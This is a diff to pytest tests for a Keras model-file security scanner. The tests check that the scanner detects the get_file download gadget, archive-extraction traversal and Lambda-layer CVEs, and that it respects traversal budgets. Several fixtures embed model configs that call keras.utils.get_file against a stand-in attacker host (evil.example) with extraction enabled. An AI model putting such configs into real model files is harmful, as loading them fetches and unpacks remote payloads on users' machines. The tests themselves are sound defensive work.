@@ -7250,7 +7250,98 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert cve_issues
+        assert "Truthy" in cve_issues[0].details["description"]
+        assert cve_issues[0].why is not None
+        assert "truthy" in cve_issues[0].why
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": "false"},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": 1},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", "false"]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    1,
+                ],
+            },
+        ],
+    )
+    def test_get_file_truthy_extraction_argument_forms_detect_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """Truthy kwargs and positional values must match Keras extraction behavior."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {"fn": "get_file", "origin": "https://evil.example/download", "extract": False},
+            {"fn": "get_file", "origin": "https://evil.example/download", "untar": 0},
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": ""},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": None},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", []]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    {},
+                ],
+            },
+        ],
+    )
+    def test_get_file_false_like_extraction_argument_forms_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """False-like extraction values must not create archive-traversal false positives."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
 
     def test_get_file_url_valued_kwargs_metadata_is_not_origin(self, tmp_path: Path) -> None:
         """URL-looking kwargs outside origin/url must not be reported as the downloaded archive."""
@@ -7519,6 +7610,28 @@ class TestKerasZipConfigTraversalBudget:
         assert len(budget_checks) == 1
         assert budget_checks[0].details["scan_outcome_reason"] == "keras_zip_config_traversal_depth_exceeded"
 
+    def test_depth_boundary_preserves_locally_inspectable_get_file_cve(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_depth": 1,
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 10_000,
+            }
+        )
+        config = {
+            "gadget": {
+                "fn": "keras.utils.get_file",
+                "url": "https://evil.example/payload.bin",
+            }
+        }
+
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        assert any(issue.details.get("cve_id") == "CVE-2025-8747" for issue in result.issues)
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
+
     def test_near_match_within_budget_does_not_trigger_get_file_cve(self, tmp_path: Path) -> None:
         """get_file and URL tokens in unrelated bounded contexts should stay benign."""
         scanner = KerasZipScanner(
@@ -7590,6 +7703,250 @@ class TestKerasZipConfigTraversalBudget:
         assert len(cve_issues) == 1
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
         assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+
+    def test_nested_kwargs_strings_are_not_double_counted(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 300,
+            }
+        )
+        config = {
+            "fn": "keras.utils.get_file",
+            "kwargs": {
+                "first": "x" * 100,
+                "second": "y" * 100,
+            },
+        }
+
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        assert result.success is True
+        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_config_string_char_limit_exceeded" not in result.metadata.get(
+            "scan_outcome_reasons",
+            [],
+        )
+
+    def test_nested_get_file_kwargs_are_not_recursively_rescanned(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 250,
+            }
+        )
+        config: dict[str, Any] = {"fn": "keras.utils.get_file", "origin": "z" * 100}
+        for _ in range(3):
+            config = {"fn": "keras.utils.get_file", "kwargs": config}
+
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        assert result.success is True
+        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_config_string_char_limit_exceeded" not in result.metadata.get(
+            "scan_outcome_reasons",
+            [],
+        )
+
+    def test_bounded_projection_limits_root_layer_scanning(self) -> None:
+        class CountingList(list[Any]):
+            item_iterations = 0
+
+            def __iter__(self) -> Iterator[Any]:
+                for item in super().__iter__():
+                    type(self).item_iterations += 1
+                    yield item
+
+        layers = CountingList({"class_name": "Dense", "config": {}} for _ in range(100))
+        config = {"class_name": "Sequential", "config": {"layers": layers}}
+        scanner = KerasZipScanner({"max_config_traversal_items": 5})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        projection_iterations = CountingList.item_iterations
+        scanner._scan_model_config(bounded_config, result)
+
+        assert CountingList.item_iterations == projection_iterations
+        assert projection_iterations <= 2
+        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_limits_inbound_node_scanning(self) -> None:
+        class CountingList(list[Any]):
+            item_iterations = 0
+
+            def __iter__(self) -> Iterator[Any]:
+                for item in super().__iter__():
+                    type(self).item_iterations += 1
+                    yield item
+
+        inbound_nodes = CountingList({"args": [], "kwargs": {}} for _ in range(100))
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "config": {},
+                        "inbound_nodes": inbound_nodes,
+                    }
+                ]
+            },
+        }
+        scanner = KerasZipScanner({"max_config_traversal_items": 9})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        projection_iterations = CountingList.item_iterations
+        scanner._scan_model_config(bounded_config, result)
+
+        assert CountingList.item_iterations == projection_iterations
+        assert projection_iterations <= 2
+        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_limits_compile_config_recursion(self) -> None:
+        class CountingList(list[Any]):
+            item_iterations = 0
+
+            def __iter__(self) -> Iterator[Any]:
+                for item in super().__iter__():
+                    type(self).item_iterations += 1
+                    yield item
+
+        metrics: Any = "mean_squared_error"
+        for _ in range(100):
+            metrics = CountingList([metrics])
+        config = {"class_name": "Sequential", "compile_config": {"metrics": metrics}}
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_depth": 5,
+                "max_config_traversal_items": 1_000,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        projection_iterations = CountingList.item_iterations
+        scanner._scan_model_config(bounded_config, result)
+
+        assert CountingList.item_iterations == projection_iterations
+        assert projection_iterations <= 6
+        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_preserves_boundary_lambda_finding(self) -> None:
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "config": {},
+                    }
+                ]
+            },
+        }
+        scanner = KerasZipScanner({"max_config_traversal_depth": 3})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        assert any(issue.details.get("cve_id") == "CVE-2024-3660" for issue in result.issues)
+        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_preserves_boundary_custom_metric_finding(self) -> None:
+        config = {
+            "class_name": "Sequential",
+            "compile_config": {
+                "metrics": [
+                    {
+                        "class_name": "EvilMetric",
+                        "config": {},
+                    }
+                ]
+            },
+        }
+        scanner = KerasZipScanner({"max_config_traversal_depth": 3})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        assert any(
+            check.name == "Custom Metric Detection" and check.details.get("identifier") == "EvilMetric"
+            for check in result.checks
+        )
+        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_preserves_item_boundary_lambda_finding(self) -> None:
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {"class_name": "Lambda", "config": {}},
+                    {"class_name": "Dense", "config": {}},
+                ]
+            },
+        }
+        scanner = KerasZipScanner({"max_config_traversal_items": 5})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        assert any(issue.details.get("cve_id") == "CVE-2024-3660" for issue in result.issues)
+        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_bounded_projection_preserves_item_boundary_custom_metric_finding(self) -> None:
+        config = {
+            "class_name": "Sequential",
+            "compile_config": {
+                "metrics": [
+                    {"class_name": "EvilMetric", "config": {}},
+                    {"class_name": "MeanSquaredError", "config": {}},
+                ]
+            },
+        }
+        scanner = KerasZipScanner({"max_config_traversal_items": 5})
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        assert any(
+            check.name == "Custom Metric Detection" and check.details.get("identifier") == "EvilMetric"
+            for check in result.checks
+        )
+        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_configured_depth_is_clamped_for_recursive_compile_consumers(self) -> None:
+        metrics: Any = "mean_squared_error"
+        for _ in range(1_000):
+            metrics = [metrics]
+        config = {"class_name": "Sequential", "compile_config": {"metrics": metrics}}
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_depth": 10_000,
+                "max_config_traversal_items": 3_000,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        assert scanner.max_config_traversal_depth == scanner.MAX_CONFIG_TRAVERSAL_DEPTH
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
 
     @pytest.mark.parametrize("detector_name", ["_check_get_file_gadget", "_check_get_file_archive_extraction"])
     def test_shallow_dict_iteration_stops_after_detector_budget(self, detector_name: str) -> None:
